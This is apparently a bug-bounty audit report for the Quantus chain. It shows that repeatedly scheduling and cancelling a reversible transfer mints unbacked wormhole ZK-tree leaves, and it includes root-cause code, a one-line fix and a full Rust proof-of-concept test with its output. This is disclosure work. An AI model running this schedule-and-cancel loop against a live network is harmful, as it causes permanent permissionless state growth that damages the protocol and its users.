# 89762 bc medium owner cancelling a reversible transfer mints an unbacked zk tree leaf permanent permissionless state growth&#x20;

**Submitted on Aug 21st 2026 at 01:42:17 UTC by @jokerbuena for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89762
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Summary

Any ordinary signed account can mint unbacked leaves into the wormhole ZK tree, permanently and repeatably, by scheduling a reversible transfer and immediately cancelling it. No value moves, no balance changes, no privileged actor is involved — yet the tree grows by one leaf per cancel and leaves are never removed.

Measured on a fresh clone of the in-scope asset at the audited commit: 15 cancels produced 15 leaves of face value 1000000000000 each — 15000000000000 of nominal ZK exit capacity — while the attacker's free balance, total balance and the chain's total issuance were byte-identical before and after.

### Scope

The defect is in Quantus's own code:

* `runtime/src/transaction_extensions.rs` — `WormholeProofRecorderExtension` (Quantus extension)
* `pallets/reversible-transfers/src/lib.rs` — Quantus pallet
* `pallets/wormhole/src/lib.rs` — Quantus pallet

All three sit inside the listed asset *"The Substrate L1 node — runtime, FRAME pallets, QPoW consensus, quantus-node"*.

Upstream `fungible::MutateHold::transfer_on_hold` and `pallet_balances::done_transfer_on_hold` appear in the causal chain as **context only**: they behave as designed and emit a truthful event. What is not designed is Quantus's recorder treating that event as a credit and minting a ZK leaf from it. This report asks for no change to unmodified upstream code.

**No privileged actor.** Both extrinsics (`schedule_transfer_with_delay`, `cancel`) are callable by any ordinary signed account. The Technical Collective plays no part.

### Root cause

`cancel` routes to `release_held_funds_with_fee`. Both of its branches force the destination to a signing account — `pallets/reversible-transfers/src/lib.rs:876` (`ensure!(who == &pending.guardian)` → `pending.guardian`) and `:879` (`ensure!(who == &pending.from)` → `pending.from`):

```rust
let apply_fee = pending.guardian != pending.from;
let (recipient, apply_fee) = if apply_fee {
    ensure!(who == &pending.guardian, Error::<T>::InvalidReverser);
    (pending.guardian.clone(), true)
} else {
    ensure!(who == &pending.from, Error::<T>::NotOwner);
    (pending.from.clone(), false)
};
```

For a one-time schedule `pending.guardian == pending.from`, so the owner branch sets `recipient = pending.from` and `:943` then calls:

```rust
pallet_balances::Pallet::<T>::transfer_on_hold(
    &HoldReason::ScheduledTransfer.into(),
    &pending.from,     // source
    recipient,         // == source
    remaining_amount, Precision::Exact, Restriction::Free, Fortitude::Polite,
)?;
```

That is a hold-to-free conversion on a single account. No credit occurs. But the balances pallet emits `TransferOnHold { source: X, dest: X, amount }`, and Quantus's `WormholeProofRecorderExtension` post-dispatch event scan treats that arm as a credit and records a wormhole leaf for X. The recorder already guards the neighbouring `ReserveRepatriated` arm for exactly this reason ("self-repatriations return early"); the `TransferOnHold` arm has no such guard.

The runtime's own weighting confirms it expects the insert: `WormholeProofRecorderExtension::<Runtime>::count_transfers(&cancel_call) == 1`.

### Impact

**Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)** — the in-scope Medium impact, matched word for word.

1. **A core invariant is permanently false.** Leaves are meant to be 1:1 with real credits. After this sequence they are not, and leaves are never removed.
2. **Permissionless, unbounded, permanent state growth.** Two extrinsics per leaf, repeatable at ordinary fee cost, by any signed account, with no delay wait.
3. **No extractable value, and that is stated deliberately.** The leaf's `to` is a signing account; the exit path (`Wormhole::verify_private_batch` / `verify_public_batch`) is gated by ZK verification in `ValidateUnsigned::pre_dispatch`, and the circuit binds `leaf.to == WA(secret)`. A signing account is not a Poseidon wormhole address, so no proof can be produced against these leaves. That is precisely why the Griefing line — the entry that does not require extractable value — is the one claimed here.

**Latent escalation, named not claimed:** if any future recipient of `release_held_funds_with_fee` can be a Poseidon address, these leaves become spendable and the class changes to unauthorised minting. Not currently reachable — both cancel branches force a signing account.

### Recommendation

Add a `(&source != &dest)` guard on the `TransferOnHold` arm of `WormholeProofRecorderExtension`'s event scan, mirroring the guard the recorder already applies to `ReserveRepatriated`. One line, in Quantus's own code.

A `source == dest` early return in upstream `transfer_on_hold` would also stop the symptom, but that is unmodified upstream Substrate and out of scope for this program; it is named only to show the guard is absent on both sides.

### Not a duplicate

The three audits shipped inside the in-scope repository (`audits/EigerWormholeAudit.pdf`, `audits/quantus-substrate-audit-20260513.pdf`, `audits/Proof-of-Work and Poseidon Security Review 1.1.pdf`) do not cover this path. Text-extracted and searched: `transfer_on_hold` 0, `TransferOnHold` 0, `unbacked` 0, `leaf_count` 0 — against positive controls `wormhole` 207, `Quantus` 205, `pallet` 389, so the search discriminates.

The single `cancel_transfer` occurrence in the substrate audit is the opposite defect: a scheduler split-counter bug where `cancel_named` lookup fails and cancellation *fails* with `CancellationFailed`, leaving funds held. Here cancellation *succeeds* and mints a leaf. Different root cause, opposite symptom, different fix.

Distinct from my other reports: not QN-92 (`execute_transfer` → `transfer_keep_alive(self)` no-op → explicit `record_transfer_proof`; different call, different recorder path, and no scheduler delay here), not QN-60 (fee 10 vs 4), not QN-61 (min-exit 10 vs 1), not QN-70 (miner fee credit without a leaf — the opposite direction).

### Link to Proof of Concept

<https://gist.github.com/JokerBUENA/b5650909ce1c3b7dccf067d21b150c43>

## Proof of Concept

### PoC

{% stepper %}
{% step %}

## Clone the in-scope asset at the audited commit

```bash
git clone --branch audit-comp-ready \
  https://github.com/immunefi-team/audit-comp-quantus-chain qn-chain
cd qn-chain
git rev-parse HEAD   # 3b243b870a5442a6e5f443056f67bbba87d472f5
```

{% endstep %}

{% step %}

## Append the attached PoC

Append `QN-93-runtime-self-cancel.rs` into the existing test module of `runtime/src/transaction_extensions.rs`, immediately before `fn run_lifecycle_with_result(`. No production code is modified.
{% endstep %}

{% step %}

## Run the test

```bash
cargo test -p quantus-runtime --lib \
  transaction_extensions::tests::self_cancelled_reversible_transfer_mints_unbacked_leaves \
  -- --nocapture
```

{% endstep %}
{% endstepper %}

Re-run on a fresh clone on 2026-08-21 (cargo 1.93.0), `git status` showing only the test file touched — the audited source is untouched:

```
running 1 test
control: plain self-transfer recorded 0 leaves (expected 0)
---------------------------------------------------------------
attacker free balance   : 10000000000000 -> 10000000000000
attacker total balance  : 10000000000000 -> 10000000000000
total issuance          : 10102000000000 -> 10102000000000
wormhole transfer_count : 0 -> 15
zk-tree leaf_count      : 0 -> 15
leaf face value each    : 1000000000000
unbacked ZK exit capacity minted: 15000000000000 (from 10000000000000 of real balance)
---------------------------------------------------------------
test transaction_extensions::tests::self_cancelled_reversible_transfer_mints_unbacked_leaves ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 49 filtered out; finished in 0.03s
```

The first printed line is the discriminating control: a plain `transfer_keep_alive(self)` driven through the *same* `run_lifecycle` records **zero** leaves. The 15 leaves therefore come from the cancel path, not from the harness.

### Verbatim output (2026-08-17, `3b243b8`, then reverted)

```
running 1 test
control: plain self-transfer recorded 0 leaves (expected 0)
---------------------------------------------------------------
attacker free balance   : 10000000000000 -> 10000000000000
attacker total balance  : 10000000000000 -> 10000000000000
total issuance          : 10102000000000 -> 10102000000000
wormhole transfer_count : 0 -> 15
zk-tree leaf_count      : 0 -> 15
leaf face value each    : 1000000000000
unbacked ZK exit capacity minted: 15000000000000 (from 10000000000000 of real balance)
---------------------------------------------------------------
test transaction_extensions::tests::self_cancelled_reversible_transfer_mints_unbacked_leaves ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 49 filtered out; finished in 0.03s
```

### PoC source — `QN-93-runtime-self-cancel.rs`

Append into the test module named above.

```rust
// QN-93 — append to runtime/src/transaction_extensions.rs `#[cfg(test)] mod tests`
// immediately before `fn run_lifecycle_with_result`.
//
// cargo test -p quantus-runtime --lib \
//   transaction_extensions::tests::self_cancelled_reversible_transfer_mints_unbacked_leaves \
//   -- --nocapture
//
// Uses the real WormholeProofRecorderExtension lifecycle (validate/prepare/post_dispatch)
// + real Wormhole + ZkTree (not MockProofRecorder).
// Distinct from QN-92: this path is owner-cancel → TransferOnHold self→self → event scan.
// Scheduler / do_execute_transfer never run.

/// QN-93 — owner-cancel of a reversible transfer mints an unbacked ZK-tree leaf.
///
/// `cancel_transfer` owner branch sets `recipient = pending.from`, then
/// `release_held_funds_with_fee` does `transfer_on_hold(from → from)`. That is a
/// hold→free conversion on one account (no credit). `MutateHold::transfer_on_hold`
/// has no `source == dest` short-circuit, so `TransferOnHold { source: X, dest: X }`
/// is emitted and the event scan records a wormhole leaf for X.
///
/// Distinct from QN-92 (`execute_transfer` → explicit `record_transfer_proof` after
/// a keep-alive no-op). This path never reaches `do_execute_transfer`.
#[test]
fn self_cancelled_reversible_transfer_mints_unbacked_leaves() {
    use frame_support::traits::Currency;

    new_test_ext().execute_with(|| {
        System::set_block_number(1);

        // alice is ordinary (only charlie is high-security). One-time schedule
        // stores `pending.guardian = pending.from` → owner-cancel, no volume fee.
        let attacker = alice();
        let amount = EXISTENTIAL_DEPOSIT * 1000;

        // ---------------- NEGATIVE CONTROL ----------------
        // Plain self-transfer must record NOTHING (`Mutate::transfer` returns
        // early on source == dest before `done_transfer`). If this control
        // recorded a leaf, the harness — not the pallet — would be manufacturing
        // the bug.
        let control_before = Wormhole::transfer_count(&attacker);
        let control_leaves = ZkTree::leaf_count();
        let self_xfer = RuntimeCall::Balances(pallet_balances::Call::transfer_keep_alive {
            dest: MultiAddress::Id(attacker.clone()),
            value: amount,
        });
        run_lifecycle(&attacker, self_xfer, || {
            assert_ok!(Balances::transfer_keep_alive(
                RuntimeOrigin::signed(attacker.clone()),
                MultiAddress::Id(attacker.clone()),
                amount,
            ));
        });
        assert_eq!(
            Wormhole::transfer_count(&attacker),
            control_before,
            "CONTROL: a plain self-transfer must not create a leaf"
        );
        assert_eq!(ZkTree::leaf_count(), control_leaves);
        println!("control: plain self-transfer recorded 0 leaves (expected 0)");

        // ---------------- THE EXPLOIT LOOP ----------------
        let free_before = Balances::free_balance(&attacker);
        let total_before = <Balances as Currency<AccountId>>::total_balance(&attacker);
        let issuance_before = <Balances as Currency<AccountId>>::total_issuance();
        let count_before = Wormhole::transfer_count(&attacker);
        let leaves_before = ZkTree::leaf_count();

        const ROUNDS: u64 = 15;
        for round in 0..ROUNDS {
            assert_ok!(ReversibleTransfers::schedule_transfer_with_delay(
                RuntimeOrigin::signed(attacker.clone()),
                MultiAddress::Id(bob()),
                amount,
                qp_scheduler::BlockNumberOrTimestamp::BlockNumber(10u32),
            ));
            let tx_id = pallet_reversible_transfers::PendingTransfersBySender::<Runtime>::get(
                &attacker,
            )[0];

            // Weighting proves the runtime EXPECTS exactly one leaf here:
            let cancel_call = RuntimeCall::ReversibleTransfers(
                pallet_reversible_transfers::Call::cancel { tx_id },
            );
            assert_eq!(
                WormholeProofRecorderExtension::<Runtime>::count_transfers(&cancel_call),
                1,
                "the extension statically charges `cancel` for one leaf insert"
            );

            run_lifecycle(&attacker, cancel_call, || {
                assert_ok!(ReversibleTransfers::cancel(
                    RuntimeOrigin::signed(attacker.clone()),
                    tx_id
                ));
            });

            // The production post_dispatch scan just inserted the leaf.
            assert_eq!(
                Wormhole::transfer_count(&attacker),
                count_before + round + 1,
                "round {round}: self-cancel recorded a wormhole transfer proof"
            );

            // Pin the event: TransferOnHold { source == dest == attacker }.
            let saw_self_hold = System::events().iter().any(|r| {
                matches!(
                    &r.event,
                    RuntimeEvent::Balances(pallet_balances::Event::TransferOnHold {
                        source,
                        dest,
                        amount: a,
                        ..
                    }) if source == &attacker && dest == &attacker && *a == amount
                )
            });
            assert!(
                saw_self_hold,
                "round {round}: expected TransferOnHold {{ source == dest == attacker }}"
            );
        }

        let free_after = Balances::free_balance(&attacker);
        let total_after = <Balances as Currency<AccountId>>::total_balance(&attacker);
        let issuance_after = <Balances as Currency<AccountId>>::total_issuance();
        let count_after = Wormhole::transfer_count(&attacker);
        let leaves_after = ZkTree::leaf_count();

        println!("---------------------------------------------------------------");
        println!("attacker free balance   : {free_before} -> {free_after}");
        println!("attacker total balance  : {total_before} -> {total_after}");
        println!("total issuance          : {issuance_before} -> {issuance_after}");
        println!("wormhole transfer_count : {count_before} -> {count_after}");
        println!("zk-tree leaf_count      : {leaves_before} -> {leaves_after}");
        println!("leaf face value each    : {amount}");
        println!(
            "unbacked ZK exit capacity minted: {} (from {} of real balance)",
            amount.saturating_mul(ROUNDS as u128),
            total_before
        );
        println!("---------------------------------------------------------------");

        assert_eq!(free_after, free_before, "no free balance was created");
        assert_eq!(total_after, total_before, "no value entered the account");
        assert_eq!(issuance_after, issuance_before, "no native was minted");
        assert_eq!(
            count_after,
            count_before + ROUNDS,
            "one unbacked leaf per self-cancel"
        );
        assert_eq!(
            leaves_after,
            leaves_before + ROUNDS,
            "the ZK tree grew by one leaf per self-cancel"
        );
        assert!(
            amount.saturating_mul(ROUNDS as u128) > total_before,
            "minted leaf face value {} exceeds the attacker's entire balance {}",
            amount.saturating_mul(ROUNDS as u128),
            total_before
        );
    });
}
```
